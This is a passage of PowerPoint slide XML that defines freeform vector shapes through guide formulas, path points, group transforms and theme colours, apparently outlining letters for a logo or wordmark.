                  <a:gd name="T42" fmla="*/ 142 w 160"/>
                  <a:gd name="T43" fmla="*/ 7 h 152"/>
                  <a:gd name="T44" fmla="*/ 142 w 160"/>
                  <a:gd name="T45" fmla="*/ 8 h 152"/>
                  <a:gd name="T46" fmla="*/ 141 w 160"/>
                  <a:gd name="T47" fmla="*/ 40 h 152"/>
                  <a:gd name="T48" fmla="*/ 140 w 160"/>
                  <a:gd name="T49" fmla="*/ 44 h 152"/>
                  <a:gd name="T50" fmla="*/ 139 w 160"/>
                  <a:gd name="T51" fmla="*/ 44 h 152"/>
                  <a:gd name="T52" fmla="*/ 136 w 160"/>
                  <a:gd name="T53" fmla="*/ 41 h 152"/>
                  <a:gd name="T54" fmla="*/ 135 w 160"/>
                  <a:gd name="T55" fmla="*/ 35 h 152"/>
                  <a:gd name="T56" fmla="*/ 129 w 160"/>
                  <a:gd name="T57" fmla="*/ 25 h 152"/>
                  <a:gd name="T58" fmla="*/ 123 w 160"/>
                  <a:gd name="T59" fmla="*/ 21 h 152"/>
                  <a:gd name="T60" fmla="*/ 102 w 160"/>
                  <a:gd name="T61" fmla="*/ 12 h 152"/>
                  <a:gd name="T62" fmla="*/ 86 w 160"/>
                  <a:gd name="T63" fmla="*/ 11 h 152"/>
                  <a:gd name="T64" fmla="*/ 67 w 160"/>
                  <a:gd name="T65" fmla="*/ 12 h 152"/>
                  <a:gd name="T66" fmla="*/ 48 w 160"/>
                  <a:gd name="T67" fmla="*/ 23 h 152"/>
                  <a:gd name="T68" fmla="*/ 40 w 160"/>
                  <a:gd name="T69" fmla="*/ 31 h 152"/>
                  <a:gd name="T70" fmla="*/ 31 w 160"/>
                  <a:gd name="T71" fmla="*/ 53 h 152"/>
                  <a:gd name="T72" fmla="*/ 29 w 160"/>
                  <a:gd name="T73" fmla="*/ 69 h 152"/>
                  <a:gd name="T74" fmla="*/ 35 w 160"/>
                  <a:gd name="T75" fmla="*/ 98 h 152"/>
                  <a:gd name="T76" fmla="*/ 48 w 160"/>
                  <a:gd name="T77" fmla="*/ 120 h 152"/>
                  <a:gd name="T78" fmla="*/ 70 w 160"/>
                  <a:gd name="T79" fmla="*/ 136 h 152"/>
                  <a:gd name="T80" fmla="*/ 99 w 160"/>
                  <a:gd name="T81" fmla="*/ 141 h 152"/>
                  <a:gd name="T82" fmla="*/ 106 w 160"/>
                  <a:gd name="T83" fmla="*/ 141 h 152"/>
                  <a:gd name="T84" fmla="*/ 112 w 160"/>
                  <a:gd name="T85" fmla="*/ 139 h 152"/>
                  <a:gd name="T86" fmla="*/ 116 w 160"/>
                  <a:gd name="T87" fmla="*/ 132 h 152"/>
                  <a:gd name="T88" fmla="*/ 116 w 160"/>
                  <a:gd name="T89" fmla="*/ 115 h 152"/>
                  <a:gd name="T90" fmla="*/ 116 w 160"/>
                  <a:gd name="T91" fmla="*/ 93 h 152"/>
                  <a:gd name="T92" fmla="*/ 115 w 160"/>
                  <a:gd name="T93" fmla="*/ 85 h 152"/>
                  <a:gd name="T94" fmla="*/ 108 w 160"/>
                  <a:gd name="T95" fmla="*/ 82 h 152"/>
                  <a:gd name="T96" fmla="*/ 100 w 160"/>
                  <a:gd name="T97" fmla="*/ 81 h 152"/>
                  <a:gd name="T98" fmla="*/ 98 w 160"/>
                  <a:gd name="T99" fmla="*/ 81 h 152"/>
                  <a:gd name="T100" fmla="*/ 96 w 160"/>
                  <a:gd name="T101" fmla="*/ 79 h 152"/>
                  <a:gd name="T102" fmla="*/ 102 w 160"/>
                  <a:gd name="T103" fmla="*/ 77 h 152"/>
                  <a:gd name="T104" fmla="*/ 132 w 160"/>
                  <a:gd name="T105" fmla="*/ 77 h 152"/>
                  <a:gd name="T106" fmla="*/ 156 w 160"/>
                  <a:gd name="T107" fmla="*/ 77 h 152"/>
                  <a:gd name="T108" fmla="*/ 158 w 160"/>
                  <a:gd name="T109" fmla="*/ 77 h 152"/>
                  <a:gd name="T110" fmla="*/ 160 w 160"/>
                  <a:gd name="T111" fmla="*/ 79 h 152"/>
                  <a:gd name="T112" fmla="*/ 157 w 160"/>
                  <a:gd name="T113" fmla="*/ 81 h 152"/>
                  <a:gd name="T114" fmla="*/ 152 w 160"/>
                  <a:gd name="T115" fmla="*/ 82 h 152"/>
                  <a:gd name="T116" fmla="*/ 148 w 160"/>
                  <a:gd name="T117" fmla="*/ 82 h 152"/>
                  <a:gd name="T118" fmla="*/ 144 w 160"/>
                  <a:gd name="T119" fmla="*/ 87 h 152"/>
                  <a:gd name="T120" fmla="*/ 144 w 160"/>
                  <a:gd name="T121" fmla="*/ 93 h 152"/>
                  <a:gd name="T122" fmla="*/ 144 w 160"/>
                  <a:gd name="T123" fmla="*/ 136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60" h="152">
                    <a:moveTo>
                      <a:pt x="144" y="136"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="144" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="141" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="141" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="41" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="124"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="86"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="65"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="54"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="110" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="141" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="141" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="141" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="139" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="139" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="123" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="69"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="69"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="98"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="158" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="158" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="148" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="1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2" name="Freeform 153">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C79F82EF-7873-4120-96A2-57231F92BBDC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5264665" y="2356000"/>
                <a:ext cx="144304" cy="130561"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 35 w 168"/>
                  <a:gd name="T1" fmla="*/ 123 h 152"/>
                  <a:gd name="T2" fmla="*/ 38 w 168"/>
                  <a:gd name="T3" fmla="*/ 139 h 152"/>
                  <a:gd name="T4" fmla="*/ 42 w 168"/>
                  <a:gd name="T5" fmla="*/ 144 h 152"/>
                  <a:gd name="T6" fmla="*/ 47 w 168"/>
                  <a:gd name="T7" fmla="*/ 145 h 152"/>
                  <a:gd name="T8" fmla="*/ 52 w 168"/>
                  <a:gd name="T9" fmla="*/ 145 h 152"/>
                  <a:gd name="T10" fmla="*/ 56 w 168"/>
                  <a:gd name="T11" fmla="*/ 147 h 152"/>
                  <a:gd name="T12" fmla="*/ 55 w 168"/>
                  <a:gd name="T13" fmla="*/ 149 h 152"/>
                  <a:gd name="T14" fmla="*/ 51 w 168"/>
                  <a:gd name="T15" fmla="*/ 149 h 152"/>
                  <a:gd name="T16" fmla="*/ 25 w 168"/>
                  <a:gd name="T17" fmla="*/ 149 h 152"/>
                  <a:gd name="T18" fmla="*/ 4 w 168"/>
                  <a:gd name="T19" fmla="*/ 149 h 152"/>
                  <a:gd name="T20" fmla="*/ 0 w 168"/>
                  <a:gd name="T21" fmla="*/ 148 h 152"/>
                  <a:gd name="T22" fmla="*/ 0 w 168"/>
                  <a:gd name="T23" fmla="*/ 147 h 152"/>
                  <a:gd name="T24" fmla="*/ 2 w 168"/>
                  <a:gd name="T25" fmla="*/ 145 h 152"/>
                  <a:gd name="T26" fmla="*/ 12 w 168"/>
                  <a:gd name="T27" fmla="*/ 144 h 152"/>
                  <a:gd name="T28" fmla="*/ 14 w 168"/>
                  <a:gd name="T29" fmla="*/ 143 h 152"/>
                  <a:gd name="T30" fmla="*/ 17 w 168"/>
                  <a:gd name="T31" fmla="*/ 132 h 152"/>
                  <a:gd name="T32" fmla="*/ 19 w 168"/>
                  <a:gd name="T33" fmla="*/ 7 h 152"/>
                  <a:gd name="T34" fmla="*/ 21 w 168"/>
                  <a:gd name="T35" fmla="*/ 2 h 152"/>
                  <a:gd name="T36" fmla="*/ 23 w 168"/>
                  <a:gd name="T37" fmla="*/ 0 h 152"/>
                  <a:gd name="T38" fmla="*/ 25 w 168"/>
                  <a:gd name="T39" fmla="*/ 0 h 152"/>
                  <a:gd name="T40" fmla="*/ 31 w 168"/>
                  <a:gd name="T41" fmla="*/ 7 h 152"/>
                  <a:gd name="T42" fmla="*/ 93 w 168"/>
                  <a:gd name="T43" fmla="*/ 68 h 152"/>
                  <a:gd name="T44" fmla="*/ 135 w 168"/>
                  <a:gd name="T45" fmla="*/ 111 h 152"/>
                  <a:gd name="T46" fmla="*/ 135 w 168"/>
                  <a:gd name="T47" fmla="*/ 25 h 152"/>
                  <a:gd name="T48" fmla="*/ 134 w 168"/>
                  <a:gd name="T49" fmla="*/ 19 h 152"/>
                  <a:gd name="T50" fmla="*/ 131 w 168"/>
                  <a:gd name="T51" fmla="*/ 11 h 152"/>
                  <a:gd name="T52" fmla="*/ 127 w 168"/>
                  <a:gd name="T53" fmla="*/ 8 h 152"/>
                  <a:gd name="T54" fmla="*/ 118 w 168"/>
                  <a:gd name="T55" fmla="*/ 7 h 152"/>
                  <a:gd name="T56" fmla="*/ 116 w 168"/>
                  <a:gd name="T57" fmla="*/ 7 h 152"/>
                  <a:gd name="T58" fmla="*/ 114 w 168"/>
                  <a:gd name="T59" fmla="*/ 6 h 152"/>
                  <a:gd name="T60" fmla="*/ 116 w 168"/>
                  <a:gd name="T61" fmla="*/ 4 h 152"/>
                  <a:gd name="T62" fmla="*/ 120 w 168"/>
                  <a:gd name="T63" fmla="*/ 3 h 152"/>
                  <a:gd name="T64" fmla="*/ 145 w 168"/>
                  <a:gd name="T65" fmla="*/ 4 h 152"/>
                  <a:gd name="T66" fmla="*/ 164 w 168"/>
                  <a:gd name="T67" fmla="*/ 3 h 152"/>
                  <a:gd name="T68" fmla="*/ 168 w 168"/>
                  <a:gd name="T69" fmla="*/ 6 h 152"/>
                  <a:gd name="T70" fmla="*/ 168 w 168"/>
                  <a:gd name="T71" fmla="*/ 7 h 152"/>
                  <a:gd name="T72" fmla="*/ 166 w 168"/>
                  <a:gd name="T73" fmla="*/ 7 h 152"/>
                  <a:gd name="T74" fmla="*/ 159 w 168"/>
                  <a:gd name="T75" fmla="*/ 8 h 152"/>
                  <a:gd name="T76" fmla="*/ 154 w 168"/>
                  <a:gd name="T77" fmla="*/ 12 h 152"/>
                  <a:gd name="T78" fmla="*/ 152 w 168"/>
                  <a:gd name="T79" fmla="*/ 24 h 152"/>
                  <a:gd name="T80" fmla="*/ 150 w 168"/>
                  <a:gd name="T81" fmla="*/ 145 h 152"/>
                  <a:gd name="T82" fmla="*/ 147 w 168"/>
                  <a:gd name="T83" fmla="*/ 152 h 152"/>
                  <a:gd name="T84" fmla="*/ 142 w 168"/>
                  <a:gd name="T85" fmla="*/ 150 h 152"/>
                  <a:gd name="T86" fmla="*/ 138 w 168"/>
                  <a:gd name="T87" fmla="*/ 148 h 152"/>
                  <a:gd name="T88" fmla="*/ 80 w 168"/>
                  <a:gd name="T89" fmla="*/ 93 h 152"/>
                  <a:gd name="T90" fmla="*/ 34 w 168"/>
                  <a:gd name="T91" fmla="*/ 44 h 152"/>
                  <a:gd name="T92" fmla="*/ 35 w 168"/>
                  <a:gd name="T93" fmla="*/ 123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68" h="152">
                    <a:moveTo>
                      <a:pt x="35" y="123"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="35" y="123"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="2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25" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="127" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="127" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="122" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="118" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="118" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="164" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="164" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="167" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="159" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="159" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="148" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="147" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="147" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="138" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="138" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="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dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp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6E1FDFF9-FEBD-4048-8E1B-23930EB02E55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="443372" y="6507315"/>
            <a:ext cx="1445777" cy="127188"/>
            <a:chOff x="4184722" y="4741141"/>
            <a:chExt cx="1455233" cy="128019"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Freeform 67">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{985B1F38-E391-440A-B684-7EC052946F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4722" y="4742069"/>
              <a:ext cx="81171" cy="98333"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 57 w 175"/>
                <a:gd name="T1" fmla="*/ 89 h 212"/>
                <a:gd name="T2" fmla="*/ 78 w 175"/>
                <a:gd name="T3" fmla="*/ 68 h 212"/>
                <a:gd name="T4" fmla="*/ 107 w 175"/>
                <a:gd name="T5" fmla="*/ 62 h 212"/>
                <a:gd name="T6" fmla="*/ 121 w 175"/>
                <a:gd name="T7" fmla="*/ 62 h 212"/>
                <a:gd name="T8" fmla="*/ 140 w 175"/>
                <a:gd name="T9" fmla="*/ 72 h 212"/>
                <a:gd name="T10" fmla="*/ 148 w 175"/>
                <a:gd name="T11" fmla="*/ 82 h 212"/>
                <a:gd name="T12" fmla="*/ 154 w 175"/>
                <a:gd name="T13" fmla="*/ 115 h 212"/>
                <a:gd name="T14" fmla="*/ 154 w 175"/>
